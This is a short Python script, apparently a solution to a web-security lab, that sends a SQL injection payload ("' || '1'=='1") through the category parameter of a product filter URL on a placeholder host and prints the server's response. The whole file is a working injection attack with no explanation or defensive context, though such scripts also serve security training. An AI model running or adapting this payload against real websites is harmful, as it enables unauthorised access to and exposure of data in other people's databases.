import requests
import re

host='YOUR_HOST'
path='/filter?category='
headers={
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
}
payload="' || '1'=='1"

res=requests.get("https://"+host+path+payload,headers=headers)

print(res.status_code)
print(res.text)